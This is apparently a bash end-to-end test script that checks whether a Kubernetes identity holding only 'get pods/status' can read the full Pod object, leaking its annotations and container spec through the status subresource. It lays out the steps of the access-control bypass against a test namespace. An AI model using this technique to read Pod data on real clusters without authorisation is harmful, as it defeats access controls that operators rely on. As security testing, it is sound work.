#!/usr/bin/env bash
# Implicit permission: get pods/status -> get Pod   (pods-status-reads-parent)
#
# Proof: an identity granted ONLY `get pods/status` cannot `get pods`, yet a GET
# on the status subresource returns the ENTIRE stored Pod (metadata + spec +
# status), not a status-only projection -- StatusREST.Get forwards verbatim to
# the shared parent store. So "status-only read" is in fact full-Pod read.
# Observed by proving the attacker's status read carries parent-only fields.
# Mechanism: ../transitions/get-status-reads-parent.md
#   p = get pods/status ; q = get pods ; when = same name+namespace.
source "$(dirname "$0")/../lib.sh"
test_start "pods-status-reads-parent"

ns="$(new_ns pod-st-read)"
secret_marker="wp-marker-${RUN_ID}"

# Pre-existing state: a Pod with a distinctive annotation (a metadata field, not
# part of status) that only a full-object read would reveal.
step "admin creates a Pod carrying a distinctive annotation"
K -n "$ns" apply -f - >/dev/null <<EOF || fail "could not create pod"
apiVersion: v1
kind: Pod
metadata:
  name: target
  annotations: { wp-e2e/marker: "${secret_marker}" }
spec:
  automountServiceAccountToken: false
  containers:
  - name: c
    image: ${IMG}
    imagePullPolicy: IfNotPresent
    command: ["sh","-c","sleep 3600"]
EOF
wait_pod_running "$ns" target 90

mk_sa "$ns" attacker
# ONLY the read on the status subresource. NOT `get pods`.
grant_ns "$ns" attacker "" "pods/status" "get"
subj="$(sa_subject "$ns" attacker)"

assert_can    "$subj" get pods/status "$ns"
assert_cannot "$subj" get pods        "$ns"   # THE GAP

# ACT (as attacker, exercising ONLY p): GET the status subresource.
raw="/api/v1/namespaces/$ns/pods/target/status"
step "attacker GETs the status subresource of Pod/target"
body="$(as_subj "$subj" get --raw "$raw" 2>/dev/null)" \
  || fail "attacker could not read pods/status"
assert_nonempty "$body" "status subresource body"

# EFFECT: the returned body is the whole Pod -- it carries metadata and spec,
# not just status. The annotation (metadata) and the container image (spec) are
# parent-only fields a status-only read should not have exposed.
assert_contains "$body" "\"kind\":\"Pod\""        "status GET returns a full Pod object"
assert_contains "$body" "$secret_marker"          "parent metadata (annotation) leaked via the status read"
assert_contains "$body" "\"image\":\"${IMG}\""    "parent spec (container image) leaked via the status read"
step "attacker read the full parent Pod (annotation '$secret_marker' and spec) through 'get pods/status' alone, without 'get pods'"

test_pass
